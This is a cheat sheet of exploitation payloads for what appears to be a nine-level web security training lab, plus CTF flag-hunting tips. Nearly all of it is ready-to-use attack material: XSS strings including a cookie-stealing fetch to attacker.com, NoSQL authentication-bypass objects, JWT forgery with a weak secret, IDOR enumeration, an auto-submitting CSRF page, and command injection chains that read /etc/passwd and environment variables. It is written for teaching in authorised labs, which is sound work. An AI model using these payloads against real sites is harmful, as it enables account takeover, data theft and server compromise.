# Exploitation Cheat Sheet

Quick reference for all 9 labs + CTF hunting tips.

## 🎯 Lab Payloads

### Level 1: Stored XSS
```html
<!-- Basic alert -->
<script>alert('XSS')</script>

<!-- Image onerror -->
<img src=x onerror="alert('XSS')">

<!-- SVG onload -->
<svg onload="alert('XSS')">

<!-- Cookie stealing -->
<script>
fetch('http://attacker.com/?cookie=' + document.cookie)
</script>
```

### Level 2: Reflected XSS
```
URL payloads:
?q=<script>alert('XSS')</script>
?q=<img src=x onerror=alert('XSS')>
?q=<svg onload=alert(document.domain)>
?q=<iframe src="javascript:alert('XSS')">
```

### Level 3: DOM XSS
```
Hash fragment payloads:
#<img src=x onerror="alert('XSS')">
#<svg onload="alert('XSS')">
#<script>alert('XSS')</script>
#<iframe src="javascript:alert('XSS')">
```

### Level 4: NoSQL Injection
```json
// Bypass authentication
{
  "email": {"$ne": null},
  "password": {"$ne": null}
}

// Login as specific user
{
  "email": "admin@example.com",
  "password": {"$ne": ""}
}

// Regex attack
{
  "email": "admin@example.com",
  "password": {"$regex": "^a"}
}

// Greater than
{
  "email": {"$gt": ""},
  "password": {"$gt": ""}
}
```

### Level 5: Broken Auth
```javascript
// Decode JWT (browser console)
const token = sessionStorage.getItem('token');
const [header, payload, signature] = token.split('.');
const decoded = JSON.parse(atob(payload));
console.log(decoded);

// Forge token with weak secret
// Using jwt.io with secret: "dev-secret"
{
  "sub": "user123",
  "email": "user@example.com",
  "roles": ["admin"]  // Escalate privileges
}
```

### Level 6: IDOR
```javascript
// Get your own user ID
GET /api/auth/me

// Access another user
GET /api/vulnerable/user/<other-user-id>

// Enumerate user IDs
GET /api/vulnerable/user/507f1f77bcf86cd799439011
GET /api/vulnerable/user/507f1f77bcf86cd799439012
// ... increment last digits
```

### Level 7: CSRF
```html
<!-- Malicious HTML page -->
<!DOCTYPE html>
<html>
<body>
  <h1>Win a Prize!</h1>
  <form id="csrf" action="http://localhost:3001/api/vulnerable/change-email" method="POST">
    <input type="hidden" name="newEmail" value="attacker@evil.com">
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

### Level 8: File Upload
```html
<!-- Create malicious.html -->
<!DOCTYPE html>
<html>
<head><title>Malicious</title></head>
<body>
  <h1>XSS via File Upload</h1>
  <script>
    alert('Executed from uploaded file!');
    // Could steal data, redirect, etc.
  </script>
</body>
</html>

<!-- Then upload this file -->
```

### Level 9: Command Injection
```bash
# Command chaining
127.0.0.1; whoami
127.0.0.1; ls -la
127.0.0.1; cat /etc/passwd
127.0.0.1; env

# Using different separators
127.0.0.1 && whoami
127.0.0.1 || whoami
127.0.0.1 | whoami

# Command substitution
127.0.0.1 `whoami`
127.0.0.1 $(whoami)

# Multiple commands
127.0.0.1; pwd; ls; whoami
```

## 🏴‍☠️ CTF Flag Hunting

### Browser DevTools Checks
```javascript
// Console
console.log(localStorage);
console.log(sessionStorage);
console.log(document.cookie);

// Check all storage
for (let key in localStorage) {
  console.log(key, localStorage[key]);
}

for (let key in sessionStorage) {
  console.log(key, sessionStorage[key]);
}

// JWT token
const token = sessionStorage.getItem('token');
if (token) {
  const parts = token.split('.');
  console.log('Header:', JSON.parse(atob(parts[0])));
  console.log('Payload:', JSON.parse(atob(parts[1])));
}
```

### Network Tab
- Check response headers (X-* custom headers)
- Look for debug info in responses
- Examine cookies
- Check for source maps

### Application Tab
- localStorage
- sessionStorage
- Cookies
- IndexedDB

### Sources Tab
- HTML comments (<!-- -->)
- JavaScript comments
- Inline scripts
- External scripts

### Common Flag Locations
1. **HTTP Headers**: X-Debug-Mode, X-Flag-Hint, etc.
2. **API Responses**: Hidden fields in JSON
3. **Console Logs**: console.log with flags
4. **HTML Source**: <!-- CTF{...} -->
5. **localStorage**: Keys like 'flag', 'debug', 'secret'
6. **sessionStorage**: Similar to localStorage
7. **JWT Payload**: Decoded token may contain flags
8. **Error Messages**: Verbose errors with flags
9. **Cookie Values**: Check all cookies
10. **URL Parameters**: Hidden params
11. **Robots.txt**: /robots.txt file
12. **Sitemap**: /sitemap.xml
13. **Source Maps**: .map files
14. **Git Files**: /.git/config (usually blocked)
15. **Swagger Docs**: /docs or /api-docs

### URL Patterns to Try
```
/robots.txt
/sitemap.xml
/.git/
/.env
/admin
/api/
/debug
/test
```

## 🔧 Useful Browser Commands

### Modify Requests
```javascript
// Using fetch to modify headers
fetch('http://localhost:3001/api/vulnerable/user/123', {
  headers: {
    'Authorization': 'Bearer ' + sessionStorage.getItem('token'),
    'X-Custom-Header': 'test'
  }
})
.then(r => r.json())
.then(console.log);
```

### Cookie Manipulation
```javascript
// Set cookie
document.cookie = "session=fakesessionid";

// Read all cookies
console.log(document.cookie);

// Delete cookie
document.cookie = "session=; expires=Thu, 01 Jan 1970 00:00:00 UTC;";
```

### Storage Manipulation
```javascript
// localStorage
localStorage.setItem('key', 'value');
localStorage.getItem('key');
localStorage.removeItem('key');
localStorage.clear();

// sessionStorage (same API)
sessionStorage.setItem('key', 'value');
```

## 📋 Quick Checklist

### For Each Lab
- [ ] Read objective carefully
- [ ] Launch interactive lab
- [ ] Open browser DevTools (F12)
- [ ] Try basic payload
- [ ] Check for flags in response
- [ ] Examine network traffic
- [ ] Check console for messages
- [ ] Submit solution
- [ ] Read remediation

### For CTF Hunting
- [ ] View page source
- [ ] Check all HTTP headers
- [ ] Inspect localStorage/sessionStorage
- [ ] Decode JWT tokens
- [ ] Read console logs
- [ ] Check cookies
- [ ] Look for HTML comments
- [ ] Try common endpoints
- [ ] Examine error messages
- [ ] Check API documentation

## 🎓 Learning Tips

1. **Understand Before Exploiting**: Read the vulnerability explanation first
2. **Use DevTools**: Get comfortable with browser developer tools
3. **Read Code Comments**: Vulnerable code has explanatory comments
4. **Try Variations**: Don't just copy-paste, understand why it works
5. **Check Remediation**: Learn the secure way to implement features
6. **Take Notes**: Document your findings and techniques
7. **Help Others**: Teaching reinforces your own learning
8. **Stay Ethical**: Only practice on authorized systems

---

**Remember**: These techniques should ONLY be used in authorized, educational environments! 🛡️
